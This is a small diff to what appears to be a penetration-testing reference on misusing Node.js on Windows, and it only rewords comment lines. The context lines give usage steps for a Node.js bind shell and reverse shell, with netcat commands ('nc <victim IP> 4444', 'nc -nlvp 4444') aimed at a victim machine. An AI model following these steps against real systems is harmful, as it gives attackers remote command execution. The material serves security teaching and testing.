@@ -634,7 +634,7 @@ The Node.js JavaScript runtime is occasionally found on a Windows system either 
 
 Example of a bind shell (socket server)<br />
 ```javascript
-// Example command execution server with authentication.
+// Example command execution with authentication.
 // (1) Save this script as "server.js"
 // (2) Launch the bind shell on the victim "node.exe server.js"
 // (3) Connect from the attacking computer "nc <victim IP> 4444"
@@ -691,7 +691,7 @@ var server = net.createServer(function(socket)
 
 Example of a reverse shell (socket client)<br />
 ```javascript
-// Example command execution client.
+// Example command execution.
 // (1) Save this script as "client.js"
 // (2) Start a netcat listener on the attacking computer "nc -nlvp 4444"
 // (3) Launch the reverse shell on the victim "node.exe client.js"
